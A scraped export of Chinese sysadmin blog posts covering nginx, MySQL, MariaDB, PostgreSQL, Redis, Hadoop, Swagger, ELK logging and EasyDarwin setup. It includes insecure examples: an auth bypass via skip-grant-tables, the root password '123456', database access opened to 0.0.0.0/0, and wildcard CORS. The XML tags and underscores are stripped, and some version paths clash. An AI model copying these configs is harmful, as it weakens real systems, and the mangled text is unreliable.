#nginx进程数，建议设置为CPU总核心数\n\nevents {\n    workerconnections  1024; #单个进程最大连接数，nginx最大连接数=进程数单进程最大连接数\n}\n\nhttp {\n    include       mime.types;\n    defaulttype  application/octet-stream;\n\n    sendfile        on;\n\n    keepalivetimeout  65; #超时时间，单位为秒\n\n    server { #代理服务器数量，可以配置多个\n        listen       80; #监听端口\n        servername  localhost; #服务器域名\n\n        charset utf-8; #字符集\n\n        location / {\n            proxypass   http://proxy.com; #反向代理名称，用于匹配集群\n            proxyredirect  default;\n        }\n\n        errorpage   500 502 503 504  /50x.html; #错误码对应转向\n        location = /50x.html {\n            root   html;\n        }\n    }\n\n    upstream proxy.com { #这里匹配反向代理名称\n        server 192.168.56.1:9000 weight=1; #真实项目地址以及权重\n        server 192.168.56.101:9000 weight=1; #权重数字越大被分配到的几率就越高\n    }\n}\n\n- -\n\nMySQL \n从个人角度来说，本人不推荐使用MySQL数据库，可以的话尽量使用MariaDB，个中缘由自行Google，如果一定要使用MySQL，请看如下配置\n\n安装 \n在CentOS 7中，系统默认安装了MariaDB，需要先进行卸载，首先使用下面命令查看已安装的MariaDB相关软件\nrpm -qa|grep mariadb\n使用以下命令卸载\nrpm -e --nodeps mariadb-libs-5.5.41-2.el70.x8664\nMinimal版本也没有libaio，需要安装\nyum -y install libaio\n以及net-tools\nyum -y install net-tools\nLinux下的MySQL分为源码安装和rpm安装，因为源码安装需要具备所有依赖项的源码，所以强烈不推荐使用源码安装，在官网下载rpm整合包就好，这里以mysql-5.7.12为例，下载后解压，不需要全部安装，依次安装如下安装包即可，顺序不可颠倒\nrpm -ivh mysql-community-common-5.7.12-1.el7.x8664.rpm\nrpm -ivh mysql-community-libs-5.7.12-1.el7.x8664.rpm\nrpm -ivh mysql-community-client-5.7.12-1.el7.x8664.rpm\nrpm -ivh mysql-community-server-5.7.12-1.el7.x8664.rpm\n安装完毕，先不要启动MySQL\n\n配置 \n修改配置文件\nvim /etc/my.cnf\n在[mysqld]下面添加一行\nskip-grant-tables\n保存后启动MySQL\nservice mysqld start\n此时可用空密码直接进入MySQL\nmysql -uroot -p\n切换到mysql库并修改密码，MySQL5.7版本的密码字段是authenticationstring，低版本是password\nuse mysql\nupdate user set authenticationstring=password('123456') where user='root';\n退出后停止数据库，将/etc/my.cnf里的修改删除后重新启动数据库，配置完毕\n\n- -\n\nMariaDB \n\n安装 \nMariaDB是CentOS推荐的数据库，安装只需要一行命令即可\nyum -y install mariadb mariadb-server\n设置为开机自启动\nsystemctl enable mariadb\n\n配置 \n安装完成后先启动MariaDB\nservice mariadb start\n运行配置向导\nmysqlsecureinstallation\n第一个提示让输入当前密码，直接回车\n第二个提示是否设置密码，直接回车\n输入密码，回车\n确认密码，回车\n是否删除匿名用户，直接回车\n是否禁止远程登录，视实际情况而定\n是否删除test数据库，直接回车\n是否重新加载权限，回车，配置完毕\n\n- -\n\nPostgreSQL \n\n安装\n\nPostgreSQL也是CentOS推荐的数据库，安装同样只需要一行命令即可\nyum install postgresql\n初始化数据库\npostgresql-setup initdb\n设置为开机自启动\nsystemctl enable postgresql\n\n配置\n\n先启动PostgreSQL\nsystemctl start postgresql\n进入数据库\nsu - postgres\n创建角色\ncreateuser admin（用户名）\n创建数据库实例\ncreatedb -e -O admin（用户名） testdb（实例名）\n进入查询分析器\npsql\n设置密码\n\\password admin;（用户名，用分号结束）\n退出查询分析器\n\\q（不需要分号结束）\n退出数据库\nexit\n修改监听\nvim /var/lib/pgsql/data/postgresql.conf\n将这句注释打开并修改\nlistenaddresses = ''\n修改验证方式\nvim /var/lib/pgsql/data/pghba.conf\n将如下内容修改或复制\nhost  all  all  127.0.0.1/32（允许哪个IP访问，如果允许全部，则写成0.0.0.0/0）  md5（md5为密码验证）\n重启数据库\nsystemctl restart postgresql\n使用密码登录数据库\npsql -U admin（用户名） -d testdb（数据库） -h 127.0.0.1（登录哪个IP）\n登录成功，配置完毕\n\n- -\n\nRedis \n\n解压后先进入redis目录，以3.2.0为例\ncd redis-2.8.17\n然后make\nmake\n进入src目录\ncd src\n运行redis-server启动redis服务\n./redis-server\n但是这样启动后不会返回命令行，所以在命令后加\u0026，启动redis后返回命令行\n./redis-server \u0026\n\n- -\n\nHadoop \n无需安装，直接解压缩后修改配置文件既可用，但需要先安装Jdk\n\n不配私钥只能玩单机版，就个人学习而言，单机版已经足够\n\n以hadoop-2.7.2为例，解压后进入hadoop路径，创建4个文件夹\nmkdir tmp\nmkdir hdfs\nmkdir hdfs/data\nmkdir hdfs/name\n配置环境变量，在末尾添加以下几行（配置完毕后不要忘记使用source令环境变量生效）\nexport HADOOPHOME=/root/download/hadoop-2.7.2\nexport PATH=$PATH:${HADOOPHOME}/bin\nhadoop不能以IP访问，要修改主机名和host映射，主机名修改（仅针对CentOS 7）\nhostnamectl set-hostname 主机名\n修改host映射文件\nvim /etc/hosts\n修改core-site.xml，注意这里是相对路径\nvim etc/hadoop/core-site.xml\n在configuration标签中添加\nproperty\n  namefs.defaultFS/name\n  valuehdfs://hadoop:9000/value\n  !-- value的含义为hdfs://主机名:端口号 --\n/property\nproperty\n  namehadoop.tmp.dir/name\n  valuefile:/root/download/hadoop-2.7.2/tmp/value\n  !-- 这里要用绝对路径 --\n/property\nproperty\n  nameio.file.buffer.size/name\n  value131702/value\n/property\n修改hdfs-site.xml，相对路径\nvim etc/hadoop/hdfs-site.xml\n同样在configuration标签中添加\nproperty\n  namedfs.namenode.name.dir/name\n  valuefile:/root/download/hadoop-2.7.1/hdfs/data/value\n  !-- 修改绝对路径 --\n/property\nproperty\n  namedfs.datanode.data.dir/name\n  valuefile:/root/download/hadoop-2.7.1/fdfs/data/value\n  !-- 修改绝对路径 --\n/property\nproperty\n  namedfs.replication/name\n  value2/value\n/property\nproperty\n  namedfs.namenode.secondary.http-address/name\n  valuehadoop:9001/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  namedfs.webhdfs.enabled/name\n  valuetrue/value\n/property\n重命名模板\nmv etc/hadoop/mapred-site.xml.template etc/hadoop/mapred-site\n修改mapred-site.xml\nvim etc/hadoop/mapred-site.xml\n同样在configuration标签中添加\nproperty\n  namemapreduce.framework.name/name\n  valueyarn/value\n/property\nproperty\n  namemapreduce.jobhistory.address/name\n  valuehadoop:10020/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  namemapreduce.jobhistory.webapp.address/name\n  valuehadoop:19888/value\n  !-- 这里别忘了修改 --\n/property\n修改yarn-site.xml，相对路径\nvim etc/hadoop/yarn-site.xml\n同样在configuration标签中添加\nproperty\n  nameyarn.nodemanager.aux-services/name\n  valuemapreduceshuffle/value\n/property\nproperty\n  nameyarn.nodemanager.auxservices.mapreduce.shuffle.class/name\n  valueorg.apache.hadoop.mapred.ShuffleHandler/value\n/property\nproperty\n  nameyarn.resourcemanager.address/name\n  valuehadoop:8032/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  nameyarn.resourcemanager.scheduler.address/name\n  valuehadoop:8030/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  nameyarn.resourcemanager.resource-tracker.address/name\n  valuehadoop:8031/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  nameyarn.resourcemanager.admin.address/name\n  valuehadoop:8033/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  nameyarn.resourcemanager.webapp.address/name\n  valuehadoop:8088/value\n  !-- 这里别忘了修改 --\n/property\nproperty\n  nameyarn.nodemanager.resource.memory-mb/name\n  value768/value\n/property\n修改hadoop-env.sh，相对路径\nvim etc/hadoop/hadoop-env.sh\n修改JAVAHOME，这里比较操蛋，配置环境变量也没有用\nexport JAVAHOME=/usr/lib/jvm/jdk7\n修改slaves，配置从服务器，相对路径\nvim etc/hadoop/slaves\n格式为每行一个，如下，再次强调，不配私钥只能玩单机版\nhadoop\ncluster01\ncluster02\n配置成功后，将hadoop复制到各个从服务器上，并在主服务器进行初始化\nhadoop namenode -format\n启动hadoop集群\nsh sbin/start-all.sh\n停止hadoop集群\nsh sbin/stop-all.sh\n在浏览器输入http://主服务器IP:8088查看集群信息\n\n未完待续","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-14 Android应用 JSON解析","title":"android中解析JSON","text":"怎样在android中解析JSON \nJackson 是一个将java对象转换成JSON与JSON转化java类的类库。Gson 是解决这个问题的流行方案，然而我们发现Jackson更高效,因为它支持替代的方法处理JSON:流、内存树模型,和传统JSON-POJO数据绑定。不过，请记住， Jsonkson库比起GSON更大，所以根据你的情况选择，你可能选择GSON来避免APP 65k个方法限制。其它选择: Json-smart and Boon JSON","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/2016-10-04 Logstash基础","title":"logstash基础","text":"Logstash 基础\n\n境缘浮影","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 CoreOS常见问题","title":"CoreOS常见问题","text":"yum install epel-release","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 优秀项目","title":"优秀项目","text":"一个用react+nodejs实现的笔记本小应用\nhttps://github.com/KellyLy/react-note\n\nswagger-editor\n跨域问题\naccess-control-allow-origin: *","tags":null},{"location":"//blog.pytool.com/Hacker/02_CMS指纹识别/2015-01-29 指纹识别","title":"指纹识别","text":"[御剑web指纹识别]\n\n网站指纹识别 whatweb\napt-get install whatweb\nwhatweb -v https://www.morningstarsecurity.com/","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone Android支持","title":"drone-android","text":"william0wang/drone-android","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 LUbuntu常见问题","title":"LUbuntu常见问题","text":"xterm字体太小\n\n方法一：CTRL+右键，会出现菜单，选择大些的字体就好了，不过关闭后再打开会恢复原状\n\n方法二：运行 xterm -fn 816, 会打开一个大字体的xterm，816也可以改成其他尺寸\n\nLx终端字母都挤到一起了\n\n解决方法：字体选成AR PL UMing\n\n挤到一起跟字体选择有关，已经尝试过AR PL UMing字体是可以的，其他字体没有尝试","tags":null},{"location":"//blog.pytool.com/Post/2017-04-18 swagger","title":"Swagger：Rest API的描述语言","text":"swaggerhub\nSwagger Specification\nOpenAPI-Specification/2.0.md\nOpenAPI Specification 2.0 中文版\nSwagger是一种Rest API的 简单但强大的表示方式，标准的，语言无关，这种 表示方式不但人可读，而且机器可读。 可以作为Rest API的交互式文档，也可以作为Rest API的形式化的接口描述，生成客户端和服务端的代码。\n\n本文介绍Swagger以下内容：\n\n    Swagger API Spec，描述Rest API的语言\n    Swagger UI，将Swagger API Spec以HTML页面展现出来的模块\n    Swagger Editor，Swagger API Spec的编辑器\n\nSwagger API Spec/Open API Spec\n\nSwagger API Spec是Swagger用来描述Rest API的语言，类似于描述Web服务的WSDL。Swagger API可以使用yaml或json来表示。 2016年1月，Swagger将Spec捐献给Open API Initiative (OAI)，成为Open API Spec的基础。\n\n@Consumes 消费  是接收客户端Request传过来的内容类型  \n@Produces 生产  写出到response的内容类型  \n@QueryParam是   接收客户端传过来的ParameterName 参数名  \n\nSwagger API Spec包含以下部分：\n\n    swagger，指定swagger spec版本，2.0\n    info，提供API的元数据\n    tags，补充的元数据，在swagger ui中，用于作为api的分组标签\n    host，主机，如果没有提供，则使用文档所在的host\n    basePath，相对于host的路径\n    schemes，API的传输协议，http，https，ws，wss\n    consumes，API可以消费的MIME类型列表\n    produces，API产生的MIME类型列表\n    展示为: POST /path summary\n    paths ，API的路径，以及每个路径的HTTP方法，一个路径加上一个HTTP方法构成了一个操作。每个操作都有以下内容：\n        method HTTP方法 [get post put delete options head patch ]\n        tags，操作的标签\n        summary，短摘要\n        description，描述\n        externalDocs，外部文档\n        operationId，标识操作的唯一字符串\n        consumes，MIME类型列表\n        produces，MIME类型列表\n        parameters，参数列表\n          name \t        string \t  必填。参数名，大小写敏感。\n          in \t          string \t  必填。参数的位置，可能的值有：query、header、path、formData和body。\n              有五种可能的参数类型：\n                  Path - 和路径模板一起使用，也就是说参数本身是路径的一部分。相对路径。例如：/items/{itemId}中，itemId为参数。\n                  Query - 添加在URL上的查询参数。例如：/items?id=###中，查询参数为id。\n                  Header - 自定义的请求头参数。\n                  Body - 附加到HTTP请求的payload。因为一个请求只能有一个payload，所以也只能有一个Body参数。body参数的名称本身并没有什么影响。考虑到Form本身也是一种Body，所以对于同一个操作，Form和Body不能共存。\n                  Form - 当请求的contentType为application/x-www-form-urlencoded或者application/form-data或者两者都有时（consumes所描述的媒体类型），用于描述附加在HTTP请求上的payload。这是唯一的一种可以用来上传文件的参数类型。Form参数基于不同的content-type有不同的格式：\n\n              application/x-www-form-urlencoded - 与Query参数格式相似，但是却是一个payload。例如：foo=1\u0026bar=swagger中，foo和bar都是表单参数。这种格式通常用于简单参数的传输。\n              multipart/form-data - 每个参数使用一个内部的header单独占一段。例如：Content-Disposition: form-data; name=\"submit-name\"，参数的名字是submit-name。这种类型的表单多用于文件传输。\n\n          description \tstring \t  参数的简述。支持GFM\n          required \t    boolean \t参数是否必填。如果说in的值为path，那么required值必须为true。\n\n        responses，应答状态码和对于的消息的Schema\n        schemes，传输协议\n        deprecated，不推荐使用\n        security，安全\n    definitions，定义API消费或生产的数据类型，使用json-schema描述，操作的parameter和response部分可以通过引用的方式使用definitions部分定义的schema\n    parameters，多个操作共用的参数\n    responses，多个操作共用的响应\n    securityDefinitions，安全scheme定义\n    security，安全声明\n    externalDocs，附加的外部文档\n\n下面是一个操作的描述\n\n  /pets/findByTags:\n    get:\n      tags:\n        pet\n      summary: Finds Pets by tags\n      description: Muliple tags can be provided with comma seperated strings. Use tag1, tag2, tag3 for testing.\n      operationId: findPetsByTags\n      produces:\n        application/json\n        application/xml\n      parameters:\n        in: query\n          name: tags\n          description: Tags to filter by\n          required: false\n          type: array\n          items:\n            type: string\n          collectionFormat: multi\n      responses:\n        \"200\":\n          description: successful operation\n          schema:\n            type: array\n            items:\n              $ref: \"#/definitions/Pet\"\n        \"400\":\n          description: Invalid tag value\n      security:\n        petstoreauth:\n          writepets\n          read_pets\n\n参数的描述包括：\n\n    name，名字\n\n    description，描述required，是否必须\n    in，位置\n        Path\n        Query\n        Header\n        Body\n        Form\n\n    （对于Body类型的参数）\n        schema，数据类型，可以详细描述，也可以引用definition部分定义的schema\n\n    （对于Body类型以外的参数）\n        type，类型\n        format，数据格式\n        allowEmptyValue，是否允许空值\n        items，对于Array类型\n        collectionFormat，对于Array类型\n        default，缺省值\n\nSwagger API Spec对你Rest API的每一个操作的请求消息的参数（Path,Query,Body,Form），响应消息的状态码和消息体的json结构都进行了详细的描述。不仅可以供给使用API的开发者学习，而且是对Rest API接口的形式化的抽象。\n\n我们完全可以把Swagger API Spec当作一个API接口的设计语言，就像CORBA IDL或Web服务的WDL一样，先定义Rest API的操作参数和应答消息，再着手实现这些Rest API，这对Rest API日后的维护也提供了一个设计文档。\nSwagger UI\n\nSwagger UI是Swagger中用于显示Rest接口文档的项目，项目由一组HTML，JavaScript和CSS组成，没有外部依赖。Swagger UI可以根据Swagger Spec的json动态生成漂亮的帮助文档。支持常见浏览器。\n\nSwagger UI如下图所示：\n\n可以访问在线Swagger UI：http://petstore.swagger.io/\n\n使用Swagger UI很容易，只要把github项目（https://github.com/swagger-api/swagger-ui）下载到本地:\n\ngit clone https://github.com/swagger-api/swagger-ui.git\n\n然后用浏览器打开dist/index.html就可以。当然也可以放到HTTP Server下通过HTTP协议访问。\n\n在浏览器地址栏中，可以在index.html后添加url参数，就可以自动打开指定的Rest APi的json描述。如：file:///E://swagger-ui/dist/index.html?url=http://petstore.swagger.io/v2/swagger.json\n\n通过编辑index.html，就可以对Swagger UI进行定制，包括：\n\n中文显示\n\n在html header中添加下面的文字。\n\nscript src='lang/translator.js' type='text/javascript'/script\nscript src='lang/zh-cn.js' type='text/javascript'/script\n\n中文翻译位于/lang/zh-cn.js文件，如果有什么不合适的翻译，可以直接修改。\n\n指定Swagger UI的表现方式\n\n比如：\n\n    docExpansion：指定操作的描述是收起的还是展开的\n    supportedSubmitMethods：允许哪些HTTP方法的文档带Try It!的按钮\n    operationsSorter：指定操作安装什么排序\n\n更多请参考官网的文档。\nSwagger Editor\n\n顾名思义，Swagger Editor是Swagger API Spec的编辑器，Swagger API Spec有2中格式，yaml和json，Swagger Editor使用yaml进行编辑，但允许导入和下载两种格式的文件。在yaml编辑器的右面有所见即所得的预览。\n\nSwagger Editor的Live Demo：Swagger Editor\n\nSwagger Editor的安装也很方便，\n\n下载最新的发布版：https://github.com/swagger-api/swagger-editor/releases/download/v2.10.1/swagger-editor.zip\n\n然后解压到文件夹，用HTTP Server将静态文件加载起来，下面是安装node.js的http server并跑起来的指令\n\nnpm install -g http-server\nwget https://github.com/swagger-api/swagger-editor/releases/download/v2.10.1/swagger-editor.zip\nunzip swagger-editor.zip\nhttp-server -p 8080 swagger-editor\n\nhttp server启动后，就可以在浏览器中输入地址进行编辑了。\n\n文件菜单提供了主要的功能\n\n    New，创建新的文件\n    Open Example，打开内建Swagger API Spec的示例\n    Paste Json，将剪贴板的内容贴到编辑器中，取代当前的内容。在Paste之前一定要先下载编辑中的内容\n    Import URL/Import File，导入已有的Swagger API Spec，可以是yaml或json格式的\n    Download YAML/Download JSON，将编辑的结果下载到本地。\n\n代码生成\n\nSwagger支持根据Swagger API Spec生成客户端和服务端的代码，支持很多语言和框架。这部分我还没有深入使用。\n参考文档\n\n    GitHub - swagger-api/swagger-ui: Swagger UI is a dependency-free collection of HTML, Javascript, and CSS assets that dynamically generate beautiful documentation from a Swagger-compliant API.\n    GitHub - swagger-api/swagger-editor: Swagger Editor\n    GitHub - swagger-api/swagger-codegen: swagger-codegen contains a template-driven engine to generate client code in different languages by parsing your Swagger Resource Declaration.\n    OpenAPI-Specification/2.0.md at master · OAI/OpenAPI-Specification · GitHub\n    JSON Schema - Documentation\n    http://petstore.swagger.io/v2/swagger.json，Swagger API Spec的官方示例","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic 日志分析filebeat配置（filebeat + logstash）","title":"elk日志分析filebeat配置（filebeat + logstash）","text":"日志格式：\n\nnginxaccess:\n\n{ \"@timestamp\":\"2017-01-23T15:16:48+08:00\",\"client\": \"192.168.0.151\",\"@version\":\"1\",\"host\":\"192.168.0.147\",\"size\":160,\"responsetime\":0.000,\"domain\":\"mv.bjfxr.com\",\"url\":\"/index.html\",\"status\":\"200\",\"ua\":\"curl/7.19.7 (x8664-neokylin-linux-gnu) libcurl/7.19.7 NSS/3.12.9.0 zlib/1.2.3 libidn/1.18 libssh2/1.2.2\"}\n{ \"@timestamp\":\"2017-01-23T15:16:48+08:00\",\"client\": \"192.168.0.151\",\"@version\":\"1\",\"host\":\"192.168.0.147\",\"size\":30027,\"responsetime\":0.001,\"domain\":\"mv.bjfxr.com\",\"url\":\"/aaaaa/index.html\",\"status\":\"200\",\"ua\":\"curl/7.19.7 (x8664-neokylin-linux-gnu) libcurl/7.19.7 NSS/3.12.9.0 zlib/1.2.3 libidn/1.18 libssh2/1.2.2\"}\n\nnginxerror:\n\n2017/01/19 08:42:53 [crit] 5621#0: 6428 connect() to unix:/tmp/php-cgi.sock failed (2: No such file or directory) while connecting to upstream, client: 192.168.0.151, server: mv.bjfxr.com, request: \"GET /dts/index/cat/cat/notice.html HTTP/1.0\", upstream: \"fastcgi://unix:/tmp/php-cgi.sock:\", host: \"mv.bjfxr.com.com\"\n2017/01/19 12:42:53 [crit] 5621#0: 6428 connect() to unix:/tmp/php-cgi.sock failed (2: No such file or directory) while connecting to upstream, client: 192.168.0.151, server: mv.bjfxr.com, request: \"GET /dts/index/cat/cat/notice.html HTTP/1.0\", upstream: \"fastcgi://unix:/tmp/php-cgi.sock:\", host: \"mv.bjfxr.com.com\"\n\ntomcat:\n\n INFO 2017-01-23 15:18:51 com.newland.bi.webservice.trans.fromsub.dao.DtsDao.queryCnt ==  Preparing: select count(1) from CTMPMART.TBWSVEGININFO where trunc(indate) = todate('20170121','yyyymmdd') and ( BATCHID = '1101008031275728')\n DEBUG 2017-01-23 15:18:51 com.newland.bi.webservice.trans.fromsub.dao.DtsDao.queryCnt ==  Parameters:\n________________________________________________________________________________________________________________________________\n\nfilebeat配置文件\n\nfilebeat.prospectors:\ninputtype: log\n  paths:\n    /home/wwwlogs/nginxaccess.log\n  documenttype: nginxaccess\n\ninputtype: log\n  paths:\n    /home/wwwlogs/nginxerror.log    ##nginx错误日志位置\n  documenttype: nginxerror               ##nginx错误日志注明类型（以后logstash不同类型创建不同索引）\n\ninputtype: log\n  paths:\n    /dts1/ctmpweb/logs/dtssvc.log\n    /dts1/ctmpweb/logs/dtsweb.log\n  documenttype: tomcatctmpweb\n  multiline.pattern: '^\\sINFO|^\\sERROR|^\\sDEBUG|^\\sWARN'      ##将日志info，error,debug,warn开头的作为一行（用于java日志多行合并，也可以用时间为开头）\n  multiline.negate: true\n  multiline.match: after\n\n  excludelines: ['^ INFO','^ DEBUG']                        ##排除info,debug开头的行\n\n  includelines: [\"^ ERROR\", \"^ WARN\"]                        ##将error，warn开头的行传给logstash\n\ninputtype: log\n  paths:\n    /dts1/intf1/logs/dtsif.log\n  documenttype: tomcatintf1\n  multiline.pattern: '^\\sINFO|^\\sERROR|^\\sDEBUG|^\\sWARN'\n  multiline.negate: true\n  multiline.match: after\n\n  excludelines: ['^ INFO','^ DEBUG']\n\n  includelines: [\"^ ERROR\", \"^ WARN\"]\n\noutput.logstash:\n  # The Logstash hosts\n   hosts: [\"10.0.1.1:5044\"]\n\n___________________________________________________________________________________________________________________________________\n\ninput {\n       beats  {\n              port =  5044\n      }\n}\n\nfilter {\n        if [type]  == \"nginxaccess\"  {\n            json {\n                source =  \"message\"\n            }\n\n}\n\noutput {\n     if [type] == \"tomcatctmpweb\" {            ##按照type类型创建多个索引\n        elasticsearch {\n                       hosts =  [\"192.168.0.148:9200\"]\n                       index =  \"tomcatctmpweb%{+YYYY.MM.dd}\"\n                                 }\n\n          }\n\n     if [type] == \"nginxaccess\" {            ##按照type类型创建多个索引\n        elasticsearch {\n                       hosts =  [\"192.168.0.148:9200\"]\n                       index =  \"nginxaccess%{+YYYY.MM.dd}\"\n                                 }\n\n          }\n\n     if [type] == \"nginxerror\" {            ##按照type类型创建多个索引\n        elasticsearch {\n                       hosts =  [\"192.168.0.148:9200\"]\n                       index =  \"nginxerror_%{+YYYY.MM.dd}\"\n                                 }\n\n          }\n\n}","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 Linux sysctl系统优化","title":"Linux 系统优化","text":"Sysctl加载配置顺序问题\n\n本地直接测试:\n加载所有的sysctl配置 sysctl --system\nsysctl -p 默认无参数只加载/etc/sysctl.conf\n发现它的顺序是先加载/etc/sysctl.d/.conf, 最后加载/etc/sysctl.conf.\n\n查看man sysctl加载顺序\n--system\n       Load settings from all system configuration files.\n       /run/sysctl.d/.conf\n       /etc/sysctl.d/.conf\n       /usr/local/lib/sysctl.d/.conf\n       /usr/lib/sysctl.d/.conf\n       /lib/sysctl.d/.conf\n       /etc/sysctl.conf      最后加载\n继续看/etc/init.d/sysctl:\n\n如果仅仅是想临时改变某个系统参数的值，可以用两种方法来实现,例如想启用IP路由转发功能：\n  1) #echo 1   /proc/sys/net/ipv4/ipforward\n  2) #sysctl -w net.ipv4.ipforward=1\n如果想永久保留配置，可以修改sudo vi /etc/sysctl.conf文件\nnet.ipv4.ipforward=0改为net.ipv4.ipforward=1\n\nelasticsearch 启动失败\n\nsudo sysctl -w vm.maxmapcount=262144\nsudo sysctl -a|grep vm.maxmapcount\necho vm.maxmapcount=262144 |sudo tee /etc/sysctl.d/10-vm.conf","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone dronefile","title":"深入理解dronefile","text":"---\n\n深入理解dronefile\n\n对于每个.drone.yml来说，pipeline的每个步骤经过drone解析后就对应一个dockerfile文件\n\n对dronefile 来说只有4个主模式 [workspace pipeline services matrix]:\n0.7 以后\nI 变量\n变量使用\ncommands:\n  echo $PLUGINKEY      ## 在运行环境时解析 echo $PLUGINKEY\n  echo $$PLUGINKEY     ## 在运行环境时解析 echo $PLUGINKEY\n  echo ${PLUGINKEY}    ## ${PLUGINKEY}变量 在.drone.yml中解析 echo ''\n  echo $${PLUGINKEY}   ## 在运行环境时解析 echo ${PLUGINKEY}\nscript:\n  pwd\n\n变量类型 有3种\n$$DOCKERPASSWORD  系统环境变量 通过-e参数传入环境变量\n$GOVERSION       # matrix定义变量\n${DRONE_xxx}      # dronefile内置变量\n\n1. 系统变量","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-29 EasyDarwin Readme","title":"EasyDarwin 配置","text":"高性能流媒体服务器EasyDarwin \n\nEasyDarwin开源流媒体服务器是EasyDarwin开源流媒体云平台的流媒体服务部分，是整个流媒体云平台的核心服务，EasyDarwin基于Apple的开源项目Darwin Streaming Server开发和扩展的，EasyDarwin支持标准RTSP/RTP/RTCP协议，具备RTSP点播、直播（推模式和拉模式）、HLS直播等功能，适应安卓、IOS、微信直播等各终端平台，最大程度贴近安防监控、移动互联网流媒体需求；\n\nEasyDarwin本身提供了一个高性能的服务端框架，Linux/Windows跨平台支持，是开发流媒体服务以及其他类型服务的极佳框架工具，EasyDarwin具备一套完整的网络I/O框架以及Utility，EasyDarwin开源团队也在不断进行更优的性能优化（epoll、线程池、内存池、堆栈调用、寄存器调用等）、应用优化（RESTful接口、WEB管理后台、配套APP等），开发者很容易在EasyDarwin的基础上开发跨平台服务程序，例如Windows、Linux、Mac、Solaris等系统平台，只要一次熟悉，将会受用终身，并且部署和开发过程简单，文档和支持完备，是互联网sup+/sup时代，对企业和开发者来说，最接地气的开源流媒体服务器；\n\n视频教程 \n\nEasyDarwin开源流媒体服务器：编译、配置、部署：http://edu.csdn.net/course/detail/2431\n\nEasyDarwin目前支持 \nMP4点播(QTSSFileModule)；\n标准RTSP推模式直播(QTSSReflectorModule)；\n标准RTSP拉模式直播(EasyRelayModule)；\nHLS直播(EasyHLSModule)；\n接入EasyDarwin流媒体平台，分布式部署(EasyCMSModule)；\n\nEasyDarwin正在进行开发的 \nOnvif支持；\n分布式部署负载均衡（结合EasyCMS）；\n\n编译、配置、部署的方法 \n\n1、获取EasyDarwin最新版本 \n在Github：https://github.com/EasyDarwin/EasyDarwin 中获取最新的EasyDarwin版本源码，自行编译成需要的可执行文件，也可以直接在 https://github.com/EasyDarwin/EasyDarwin/releases 中下载已经归档的相应版本进行部署；\n  最好的选择就是：从归档版本中获取可执行文件或者获取源码编译成可执行文件，未归档的版本可能正在开发迭代中，各个模块都可能不是很完善；\n\n2、编译EasyDarwin可执行文件 \n\n【如果直接下载已经编译好的Release归档版本，可跳过此步骤】  \n\nWindows版本编译，可以直接用Visual Studio 2008打开源码文件中的：/EasyDarwin-master/EasyDarwin/WinNTSupport/EasyDarwin.sln解决方案文件，编译出exe可执行文件EasyDarwin.exe，也可以用更高版本的vs进行编译，vs向下兼容，所以编译应该不是什么大问题，可能会有部分编译选项需要调整，这个根据实际情况调整即可，可以肯定的是，源码编译都是没有问题的；\n  经常会有开发者在编译完成后直接vs运行出现无法运行xxx.lib或者缺少xxx.dll的问题，建议好好补补基础知识：\n    1. vs调试运行需要设置EasyDarwin项目为启动项；\n  2. 运行缺少dll时，可以将dll复制到vs的EasyDarwin.vcproj同级目录，或者设置EasyDarwin.vcproj项目熟悉，将dll路径以环境变量的形式添加到vs：\n  Linux版本编译，将从Github获取的EasyDarwin源码zip文件进行unzip解压，再进行具体编译：\n\n  cd ./EasyDarwin-master/EasyDarwin/\n\tchmod +x ./Buildit\n\t./Buildit\t（./Buildit i386 or ./Buildit x64编译出相应版本的可执行文件）\n\tcd ./x64  (or cd ./Release)\n\n3、配置easydarwin.xml \nEasyDarwin主要的几个配置项：\n\nrtspport：EasyDarwin RTSP服务监听的端口；\n\nmoviefolder：流媒体文件本地存储的路径，包括点播mp4文件、直播切片生成的hls（m3u8+ts）文件；\n\nhttp\\service\\port：RESTful服务端口；\n\nhls\\output\\enabled：配置QTSSReflectorModule在接收推送的同时，是否同步输出hls流；\n\nHTTP\\ROOT\\DIR：配置EasyHLSModule的对外WEB路径，用于hls分发的web服务器路径；\n\nlocal\\ip\\address：配置EasyRelayModule对外服务的ip地址，因为可能会有多网卡或者内网映射，所以需要手动配置；\n\n以Linux系统nginx做WEB服务器为例，比如我们将点播文件存储在/EasyDarwin/movies/目录，也就是\n\n    PREF NAME=\"moviefolder\" /EasyDarwin/movies//PREF\n\nNginx的WEB地址为：http://8.8.8.8/，那么我们配置：\n\n    PREF NAME=\"HTTPROOTDIR\" http://8.8.8.8//PREF\n这样就能够将EasyDarwin存储的HLS文件WEB发布到公网了，具体配置可以参考后面HLS直播配置章节。\n\n4、运行EasyDarwin \n\n【前提】EasyDarwin可执行文件必须与/html/目录在同一层目录中\n\nWindows调试运行：\n\n    EasyDarwin.exe -c ./easydarwin.xml -d  \n  注：需要把libEasyHLS.dll，libEasyPusher.dll，libEasyRTSPClient.dll，/html/文件夹拷贝到可执行程序的同目录下！\n\nWindows服务方式运行：\n\n我们提供一段脚本\n\n    cd ./\n    set curPath=\"%cd%\"\n    echo service path：%curPath%\n    sc create EasyDarwin binPath= \"%curPath%\\EasyDarwin.exe -c %curPath%\\easydarwin.xml\" start= auto\n\tsc failure EasyDarwin reset= 0 actions= restart/0\n    net start EasyDarwin\n    pause\n\n将这段脚本做成bat，运行，我们就创建了一个叫做EasyDarwin的Windows服务了，通过系统服务（services.msc）可以查看到。\n注：Windows不同版本可能稍有差异，建议在命令行运行bat脚本，而不是直接双击运行，这样能看到具体出错原因！\n\nLinux调试运行\n\n    ./easydarwin -c ../WinNTSupport/easydarwin.xml  -d\n\nLinux后台服务方式运行\n\n    ./easydarwin -c /etc/streaming/easydarwin.xml  